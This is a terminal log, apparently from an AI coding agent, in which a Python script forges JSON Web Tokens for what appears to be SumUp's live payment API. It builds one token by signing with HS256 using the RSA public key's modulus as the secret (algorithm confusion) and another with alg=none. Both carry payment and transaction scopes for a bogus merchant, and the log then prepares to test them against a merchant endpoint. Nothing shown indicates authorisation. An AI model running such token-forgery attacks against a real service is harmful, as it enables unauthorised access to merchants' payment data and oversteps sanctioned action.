[0m$ [0mcd /tmp/opencode && python3 - <<'EOF'
import json, base64, hashlib, hmac
j = json.load(open('jwks.json'))
rsa = [k for k in j['keys'] if k.get('kty')=='RSA'][0]
kid = rsa['kid']
modulus_b64url = rsa['n'].encode()  # already base64url
# decode the RSA modulus bytes -> use raw modulus bytes as HMAC secret (classic confusion uses PEM pubkey, but bytes-based libs use n as-is)
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
# claims: aud = api.sumup.com, scp = full REST scopes, sub = bogus merchant
claims = {
  "aud": "https://api.sumup.com",
  "iss": "https://auth.sumup.com",
  "sub": "bogus-sub-123",
  "scp": ["payments","transactions.history","checkouts.read","receipts.read","user.profile"],
  "merchant_code": "BOGUS000",
  "exp": 1893456000, "iat": 1700000000
}
def sign_hs256(secret_bytes):
    header = {"alg":"HS256","typ":"JWT","kid":kid}
    h = b64(json.dumps(header,separators=(',',':')).encode())
    p = b64(json.dumps(claims,separators=(',',':')).encode())
    sig = hmac.new(secret_bytes, h+b'.'+p, hashlib.sha256).digest()
    return (h+b'.'+p+b'.'+b64(sig)).decode()
# variant 1: modulus raw bytes as secret
t1 = sign_hs256(base64.urlsafe_b64decode(modulus_b64url + b'='*((4-len(modulus_b64url)%4)%4)))
open('hs256_modulus.txt','w').write(t1)
# variant 2: PEM-ish pubkey string as secret (our own concat) -- skip
# alg=none
def alg_none():
    header = {"alg":"none","typ":"JWT","kid":kid}
    h = b64(json.dumps(header,separators=(',',':')).encode())
    p = b64(json.dumps(claims,separators=(',',':')).encode())
    return (h+b'.'+p+b'.').decode()
t2 = alg_none()
open('algnone.txt','w').write(t2)
print("HS256(len=%d) kid=%s" % (len(t1), kid))
print("NONE(len=%d)" % len(t2))
EOF
echo "--- test HS256-confusion on /v1/merchants/BOGUS000 ---"
